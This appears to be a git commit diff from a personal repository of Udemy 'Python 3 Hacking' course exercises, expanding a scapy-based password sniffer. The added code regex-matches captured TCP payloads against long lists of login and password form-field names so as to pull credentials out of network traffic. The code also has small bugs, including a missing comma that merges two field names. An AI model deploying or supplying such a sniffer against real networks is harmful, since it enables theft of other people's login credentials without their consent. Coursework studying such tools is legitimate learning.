ad41a60c51a8abff7e466eb57918ef70ccf6e159
albert18 <erertech@gmail.com>
2022-12-19 20:11:58 +0300

    update

--- 4. Udemy/1. Python 3 Hacking/5. Password Sniffer/pass-sniffer.py
+++ 4. Udemy/1. Python 3 Hacking/5. Password Sniffer/pass-sniffer.py
@@ -4,18 +4,38 @@ import re
 
 iface = 'eth0'
 
-def get_login_pass():
+def get_login_pass(body):
     
     user = None
     passwrd = None
+    
+    userfields = ['log', 'login', 'wpname', 'ahd_username', 'unickname', 'nickname', 'user', 'user_name',
+                  'alias', 'pseudo', 'email', 'username', '_username', 'userid', 'form_loginname', 'loginname',
+                  'login_id', 'loginid', 'session_key', 'sessionkey', 'pop_login', 'uid', 'id', 'user_id', 'screename',
+                  'uname', 'ulogin', 'acctname', 'account', 'member', 'mailaddress', 'membername', 'login_username',
+                  'login_email', 'loginusername', 'loginemail', 'uin', 'sign-in', 'usuario']
+    passfields = ['ahd_password', 'pass', 'password', '_password', 'passwd', 'session_password', 'sessionpassword',
+                  'login_password', 'loginpassword', 'form_pw', 'pw', 'userpassword', 'pwd', 'upassword',
+                  'login_password'
+                  'passwort', 'passwrd', 'wppassword', 'upasswd', 'senha', 'contrasena']
+    
+    for login in userfields:
+        login_re = re.search('(%s=[^&]+)' % login, body, re.IGNORECASE)
+        if login_re:
+            user = login_re.group()
+    for passfield in passfields:
+        pass_re = re.search('(%s=[^&]+)' % passfield, body, re.IGNORECASE)
+        if pass_re:
+            passwrd = pass_re.group()
+            
+    if user and passwrd:
+        return(user, passwrd)
 
 def pkt_parser(packet):
     if packet.haslayer(TCP) and packet.haslayer(Raw) and packet.haslayer(IP):
         body = str(packet[TCP].payload)
-        get_login_pass(body)
+        username, password = get_login_pass(body)
         
-    
-
 try:
     sniff(iface=iface, prn=pkt_parser, store=0)
 except KeyboardInterrupt:
